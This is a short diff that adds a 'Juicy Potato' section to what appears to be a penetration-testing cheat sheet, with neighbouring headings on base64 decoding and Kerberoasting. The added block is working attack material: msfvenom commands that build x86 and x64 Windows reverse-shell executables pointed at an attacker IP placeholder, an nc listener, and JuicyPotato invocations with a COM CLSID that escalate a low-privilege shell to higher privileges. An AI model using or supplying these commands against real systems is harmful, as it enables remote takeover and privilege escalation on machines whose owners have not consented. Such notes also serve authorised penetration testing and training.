@@ -1696,6 +1696,27 @@ jq -r '.[].content_attribute_here' /path/to/json | base64 -d >/path/to/pdf
 
 
 
+## JUICY POTATO
+```
+# compile / download exe for arch + upload to victim via low priv shell
+# generate new reverse shell + upload to victim
+# x86
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
+# x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
+
+# start listener on attacker machine
+rlwrap nc -lnvp port_here
+
+# call juicy potato
+# x86
+C:\path\to\Juicy.Potato.x86.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+# x64
+C:\path\to\JuicyPotato.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+```
+
+
+
 ## KERBEROAST
 ```
 # get users with Service Principal Names (SPNs)
